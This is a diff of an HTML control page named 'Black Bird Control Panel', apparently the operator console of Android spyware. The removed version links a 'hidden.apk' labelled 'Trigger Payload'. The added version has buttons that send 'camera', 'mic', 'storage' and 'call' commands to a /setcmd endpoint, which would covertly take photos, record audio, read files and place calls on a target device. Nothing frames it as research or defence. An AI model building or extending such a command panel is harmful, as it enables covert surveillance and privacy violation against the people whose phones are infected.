@@ -1,34 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Blackbird Control Panel</title>
   <meta charset="UTF-8">
+  <title>Black Bird Control Panel</title>
   <style>
     body {
-      background-color: #0a0a0a;
-      color: #39ff14;
+      background: #000;
+      color: #0f0;
       font-family: monospace;
-      text-align: center;
-      padding-top: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
-    a {
-      color: #39ff14;
-      font-size: 20px;
-      text-decoration: none;
-      border: 1px solid #39ff14;
+    h1 {
+      color: #0ff;
+    }
+    button {
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
       padding: 10px 20px;
-      border-radius: 5px;
-      transition: background 0.3s;
+      margin: 10px;
+      cursor: pointer;
     }
-    a:hover {
-      background: #39ff14;
+    button:hover {
+      background: #0f0;
       color: #000;
     }
   </style>
 </head>
 <body>
-  <h1>BLACKBIRD: Remote Trigger</h1>
-  <p>Click below to deploy</p>
-  <a href="hidden.apk" download>Trigger Payload</a>
+  <h1>Black Bird Control Panel</h1>
+  <button onclick="sendCommand('camera')">Take Photo</button>
+  <button onclick="sendCommand('mic')">Record Mic (5s)</button>
+  <button onclick="sendCommand('storage')">Access Storage</button>
+  <button onclick="sendCommand('call')">Trigger Call</button>
+
+  <script>
+    function sendCommand(cmd) {
+      fetch('/setcmd', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cmd })
+      }).then(res => {
+        if (res.ok) {
+          alert("Command sent: " + cmd);
+        } else {
+          alert("Failed to send command.");
+        }
+      });
+    }
+  </script>
 </body>
 </html>
